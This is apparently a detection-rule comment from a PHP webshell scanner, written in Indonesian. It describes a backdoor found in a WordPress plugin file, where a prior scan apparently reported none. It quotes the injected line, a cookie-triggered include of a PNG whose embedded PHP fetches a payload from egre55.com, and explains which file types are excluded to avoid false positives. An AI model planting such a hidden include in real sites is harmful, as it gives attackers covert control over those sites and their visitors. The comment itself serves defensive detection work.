  # kodam13tniadmil (laporan Sonnet: "0 webshell"): redirect-page.php milik
  # plugin capability-manager-enhanced disisipi satu baris di awalnya —
  # `if(isset($_COOKIE["imgme"])){$incName=".../images/fb9.png";
  # include($incName);exit;}`. fb9.png adalah PNG sah yang chunk tEXt-nya
  # memuat PHP pengunduh muatan dari egre55.com. SVG sengaja tidak termasuk:
  # tema sah meng-include SVG untuk menyisipkan ikon. .txt/.css juga tidak:
  # aplikasi PHP lama meng-include potongan menu berekstensi .txt
  # (disbintaladtniad admin1/lefnav.php `include("menupenulis.txt")`).
